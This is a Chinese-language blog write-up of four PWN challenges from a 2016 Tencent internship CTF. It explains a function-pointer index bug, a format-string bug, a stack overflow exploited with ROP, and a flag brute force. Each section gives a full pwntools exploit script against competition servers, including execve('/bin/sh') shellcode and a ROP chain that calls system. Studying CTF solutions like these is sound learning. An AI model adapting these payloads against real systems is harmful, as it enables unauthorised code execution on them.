---
layout: post
title: 腾讯实习30强writeup（PWN）
categories:
  - 安全
url: 230.html
id: 230
comments: false
date: 2016-07-07 18:32:15
tags:
---

### 1\. PWN1 tc

Linux下的保护机制基本都没开，查看程序逻辑，发现我们输入的一个变量值v6会决定函数指针v7，其中 funcs是一个全局数组，并没有对v6值进行判断，因此我们可以通过设置v6的值让函数指向某个地址，观察全局变量区我们发现存在buf这个全局数组，而这个字符数组内容是在readIntergers函数中由用户输入的，因此我们可以控制buf的前四个字节为buf+4的地址，buf+4开始为linux shell的payload。

  ![](http://skysider.com/wp-content/uploads/2016/07/880086a5c7ab00679603d26688d52191.png) 

Exp如下：

#!/usr/bin/env python

from pwn import *



DEBUG = 0

buf_addr = 0x0804a0a0

#context.log_level = 'debug'

if DEBUG:

    p = process("./bin/tc1")

else:

    p = remote('106.75.9.11', 20000)



def exp():

    p.recvuntil("Divide\\n")

    p.sendline("29")

    p.recvuntil("\]\\n")

    payload = p32(buf_addr+4)

    payload += "\\x6a\\x0b"

    payload += "\\x58"

    payload += "\\x31\\xf6"

    payload += "\\x56"

    payload += "\\x68\\x2f\\x2f\\x73\\x68"

    payload += "\\x68\\x2f\\x62\\x69\\x6e"

    payload += "\\x89\\xe3"

    payload += "\\x31\\xc9"

    payload += "\\x89\\xca"

    payload += "\\xcd\\x80"

    #raw_input("set bp")

    p.sendline(payload)

    p.interactive()


exp()

### 2\. PWN2 echo-200

这个程序是一个静态链接的程序，checksec发现只开启了stack canary.

  ![](http://skysider.com/wp-content/uploads/2016/07/0ea6274aa849ebb43ec25758f583517d.png) 

下面查看程序逻辑，逻辑比较简单，只是不断的读字符和打印字符 

![](http://skysider.com/wp-content/uploads/2016/07/623e56fdb5692830d866e359a9e332b3.png) 

注意到while循环里printf存在明显的格式化串漏洞，没开nx，我们就可以考虑直接将linux 获取shell的shellcode放在buffer里，利用思路如下：首先leak出buffer地址，根据size与buffer的相对偏移计算出size的地址，然后将size改为0x200，扩大buffer的size之后，下面就是劫持程序流程，我们可以计算出调用printf时返回地址与buffer的偏移，从而将返回地址修改为buffer中的某个地址，完整的利用exp如下：  

#!/usr/bin/env python
from pwn import *

DEBUG = 0
if DEBUG:
	p = process('./bin/echo-200')
else:
	p = remote('106.75.9.11', 20001)

context.log_level = 'debug'
def exp():
    p.recvuntil("\\n")
    p.sendline("%5$x")
    buf_addr = u32(p.recvuntil('\\n')\[:-1\].decode('hex')\[::-1\])
    print "buf\_addr =>", hex(buf\_addr)
    p.recvuntil("\\n")
    payload = p32(buf_addr-0xc)
    payload += "%"+str(0x200-4)+"c"
    payload += "%7$hn"
    p.sendline(payload)
    p.recvuntil('\\n')
    ret\_addr = buf\_addr - 0x20
    payload\_addr = buf\_addr + 0x100
    print "payload\_addr =>", hex(payload\_addr)
    payload\_low\_addr= payload_addr & 0xffff
    payload\_high\_addr = payload_addr >> 16
    if payload\_high\_addr > payload\_low\_addr:
	payload2 = p32(ret_addr)
	payload2 += p32(ret_addr+2)
	payload2 += '%'+str(payload\_low\_addr - 8)+'c'
	payload2 += "%7$hn"
	payload2 += '%'+str(payload\_high\_addr - payload\_low\_addr)+'c'
	payload2 += "%8$hn"
	payload2 += 'a'*(0x100- len(payload2))
	payload2 += "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    else:
	payload2 = p32(ret_addr+2)
	payload2 += p32(ret_addr)
	payload2 += '%'+str(payload\_high\_addr - 8)+'c'
	payload2 += "%7$hn"
	payload2 += '%'+str(payload\_low\_addr - payload\_high\_addr)+'c'
	payload2 += "%8$hn"
	payload2 += 'a'*(0x100- len(payload2))
	payload2 += "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

    p.sendline(payload2)
    p.interactive()

exp()

   

### 3\. PWN3 qwb3

这个程序开启了NX，查看程序逻辑，发现vulnerable_function函数存在明显的栈溢出，主要在于怎么利用

  ![](http://skysider.com/wp-content/uploads/2016/07/b64cd3d7f13974bb7f619f198f200c78.png) 

开始的思路是构造rop去leak write函数和read函数的地址，然后利用libc-database去找对应的libc，后来leak出来之后发现没有对应的libc版本，接下来想到直接用pwntools的dynelf去爆破system函数地址，与leak出来的write函数地址计算偏移。下次攻击时只需要leak处write函数便可计算出system函数地址，最后就是构造rop去写/bin/sh，并传给system函数，此处可以参考[http://drops.wooyun.org/papers/7551，里面介绍了一段x64](http://drops.wooyun.org/papers/7551，里面介绍了一段x64)下一段比较通用的gadget，exp如下：

  

#!/usr/bin/env python
from pwn import *

DEBUG = 0
main = 0x40049d
binsh_addr = 0x601300

if DEBUG:
    p = process("./bin/qwb3")
    offset = 0x9c6d0
else:
    p = remote("106.75.8.230", 19286)
    offset = 0x9cc20

def leak(addr):
    payload = 'a'*72
    payload += p64(0x400631) # pop rsi, pop r15, ret
    payload += p64(addr) 
    payload += 'b'*8
    payload += p64(0x4005b6) 
    p.sendline(payload)
    data = p.recv(8)
    log.debug("%#x => %s" %(addr, (data or '').encode('hex')))
    p.recv()
    return data

def exp():
    '''
    p.recvuntil("\\n")
    d = DynELF(leak, main, elf=ELF('./bin/qwb3'))
    system_addr = d.lookup('system', 'libc')
    write_addr = d.lookup('write', 'libc')
    print "system\_addr =>", hex(system\_addr)
    print "offset =>", hex(write\_addr - system\_addr)
    p.interactive()
    '''
    p.recvuntil("\\n")
    payload = 'a'*72
    payload += p64(0x400631) # pop rsi, pop r15, ret
    payload += p64(0x601018) #got_write
    payload += p64(0)
    payload += p64(0x400633) # pop rdi, ret
    payload += p64(1) 
    payload += p64(0x400450) # plt_write
    payload += p64(0x400631) # pop rsi, pop r15, ret
    payload += p64(binsh_addr) # buf
    payload += p64(0) #rbp
    payload += p64(0x400633) # pop rdi, ret
    payload += p64(0)
    payload += p64(0x400460) # r12 read@got
    payload += p64(0x40059d) # vuln_function
    #raw_input("bp")
    p.sendline(payload)
    write_addr = u64(p.recv(8))
    system\_addr = write\_addr - offset
    print "system\_addr =>", hex(system\_addr)
    #raw_input("bp2")
    p.sendline('/bin/sh'+'\\x00')
    payload2 = 'a'*72
    payload2 += p64(0x400633)  #pop rdi, ret
    payload2 += p64(binsh_addr)  #
    payload2 += p64(system_addr)
    p.sendline(payload2)
    p.recv()
    p.interactive()

exp()

  

### 4\. PWN4

主程序逻辑如下：

  ![](http://skysider.com/wp-content/uploads/2016/07/61d90c0cc0c7d5f92cd33644556392f2.png)

其中，welcome函数和inputName函数分别是打印信息和输入用户名，checkFlag函数大概逻辑是要求你输入flag，并根据你输入的flag的长度与远程的flag相应前几个对应字符进行对比，匹配与不匹配时输出的信息不一样，这里就存在爆破的可能，首先爆破第一个字符，成功后继续爆破第二个，依次破解单个字符

  ![](http://skysider.com/wp-content/uploads/2016/07/91a4403e92c83d9c42a90b470fd87959.png)

Exp如下：

  

#!/usr/bin/env python
from pwn import *
import string
import time

whole_flag = ""
isCorrect = False

def exp(flag):
    global whole_flag
    global isCorrect
    p = remote('106.75.8.230', 13349)
    p.recvuntil("YOUR NAME:")
    p.sendline('aaa')
    p.recvuntil("again?\\n")
    p.sendline('aaa')
    p.recvuntil("FLAG: ")
    p.sendline(flag)
    result = p.recv()
    if result.find("submit")>=0:
        whole_flag = flag
        isCorrect = True
        print "current flag:", flag,
    p.close()

#exp(whole_flag)
while len(whole_flag) < 20:
    isCorrect = False
    for i in string.ascii\_letters+string.digits+'{\_}':
        exp(whole_flag+i)
        time.sleep(0.5)
        if isCorrect == True:
            break
    if not isCorrect:
        print whole_flag
        break

print "whole flag：", whole_flag